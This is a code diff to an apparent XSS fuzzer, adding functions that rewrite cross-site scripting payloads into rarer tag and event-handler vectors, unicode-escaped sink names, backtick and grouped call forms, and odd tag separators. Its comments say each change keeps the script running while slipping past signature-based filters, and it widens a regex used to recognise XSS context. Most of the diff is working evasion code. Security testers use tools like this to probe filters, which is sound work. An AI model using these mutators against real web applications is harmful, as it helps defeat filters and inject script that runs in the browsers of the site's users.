@@ -258,6 +258,90 @@ def quoteless_vector(payload):
     return prefix + markup[:match.start()] + variant + markup[match.end():]
 
 
+# ---------------------------------------------------------------------------
+# Pentester vectors
+#
+# These mirror what an analyst reaches for off an XSS cheat sheet: less-common
+# tag/handler combinations, unicode-escaped identifiers, alternative call forms
+# and browser-tolerated tag separators. All preserve execution.
+# ---------------------------------------------------------------------------
+
+def _extract_js_body(markup):
+    """Pull the executable JS out of injected markup (script body or a call)."""
+    script = re.search(r"<script(?:\s[^>]*)?>(.*?)</script>", markup,
+                       flags=re.IGNORECASE | re.DOTALL)
+    if script:
+        return script.group(1).strip()
+    call = re.search(r"\b(?:alert|confirm|prompt)\s*\([^()]*\)", markup, re.IGNORECASE)
+    return call.group(0) if call else ''
+
+
+def rare_event_vector(payload):
+    """Rebuild the JS body as a less-common tag/handler vector from the cheat sheet."""
+    prefix, markup = _split_markup(payload)
+    body = _extract_js_body(markup)
+    if not body:
+        return payload
+    attr = body.replace('"', "&quot;").replace("'", "&#39;")
+    variant = random.choice([
+        f'<marquee onstart="{attr}"></marquee>',
+        f'<video><source onerror="{attr}"></video>',
+        f'<audio src=x onerror="{attr}"></audio>',
+        f'<input autofocus onfocus="{attr}">',
+        f'<select autofocus onfocus="{attr}"></select>',
+        f'<svg><animate onbegin="{attr}" attributeName=x dur=1s></svg>',
+        f'<keygen autofocus onfocus="{attr}">',
+    ])
+    return prefix + variant
+
+
+def js_unicode_escape(payload):
+    """Replace a letter of the sink name with a JS unicode escape.
+
+    ``\\u0061lert`` is a valid JavaScript identifier for ``alert`` inside a
+    script or event-handler context, so execution is unchanged while the
+    literal keyword no longer appears.
+    """
+    match = re.search(r"\b(alert|confirm|prompt|eval)\b", payload)
+    if not match:
+        return payload
+    name = match.group(1)
+    i = random.randrange(len(name))
+    escaped = name[:i] + "\\u%04x" % ord(name[i]) + name[i + 1:]
+    return payload[:match.start()] + escaped + payload[match.end():]
+
+
+def js_call_variation(payload):
+    """Vary the invocation form to defeat ``name(`` signature rules.
+
+    Grouped references ``(alert)(1)`` / ``[alert][0](1)`` keep any argument;
+    the backtick template ``alert`1``` drops the parentheses entirely and is
+    only used when the argument is a bare number so the call stays equivalent.
+    """
+    match = re.search(r"\b(alert|confirm|prompt)\s*\(\s*([^()]*?)\s*\)", payload, re.IGNORECASE)
+    if not match:
+        return payload
+    name, arg = match.group(1), match.group(2).strip()
+    variants = [f"({name})({arg})", f"[{name}][0]({arg})"]
+    if re.fullmatch(r"[+-]?\d*", arg):
+        variants.append(f"{name}`{arg}`")
+    return payload[:match.start()] + random.choice(variants) + payload[match.end():]
+
+
+def tag_separator_obfuscation(payload):
+    """Swap the space after a tag name for a browser-tolerated separator.
+
+    Browsers accept ``/``, tab, newline or form-feed between a tag name and its
+    first attribute, so ``<img/onerror=...>`` still runs while evading rules
+    that expect ``<img `` followed by a space.
+    """
+    match = re.search(r"(<\s*[A-Za-z][\w:-]*)\s+(?=[A-Za-z])", payload)
+    if not match:
+        return payload
+    sep = random.choice(["/", "\t", "\n", "\x0c", "//", "/ /"])
+    return payload[:match.end(1)] + sep + payload[match.end():]
+
+
 _BENIGN_WORDS = (
     "the quick brown fox jumps over a lazy dog while people read the news and "
     "share photos of their family holidays booking hotels flights and trains "
@@ -303,6 +387,10 @@ class XssFuzzer:
         js_fromcharcode,
         scheme_obfuscation,
         quoteless_vector,
+        rare_event_vector,
+        js_unicode_escape,
+        js_call_variation,
+        tag_separator_obfuscation,
     ]
 
     def __init__(self, payload, max_length=2048, max_chain=4, dilution=None):
@@ -382,13 +470,15 @@ class XssFuzzer:
         # including the obfuscated forms (eval/atob/fromCharCode, split calls,
         # entity-broken schemes) so valid evasion variants are not rejected.
         marker = re.compile(
-            r'<\s*(?:script|svg|img|iframe|details|body|a|video|audio|'
-            r'object|embed|math|marquee|input|form)\b|'
+            r'<\s*(?:script|svg|img|iframe|details|body|a|video|audio|source|'
+            r'object|embed|math|marquee|input|select|keygen|animate|textarea|'
+            r'form)\b|'
             r'on[a-z]+\s*=|'
             r'java[^a-z]{0,6}script\s*:|'
-            r"\b(?:alert|confirm|prompt|eval|atob|setTimeout|setInterval)\s*\(|"
+            r"\b(?:alert|confirm|prompt|eval|atob|setTimeout|setInterval)\s*[\(`]|"
             r'fromCharCode\s*\(|'
-            r"\[\s*['\"][a-z]", re.I
+            r'\\u00[0-9a-f]{2}|'
+            r"\[\s*['\"a-z]", re.I
         )
         if not marker.search(payload):
             return False, 'no-xss-context'
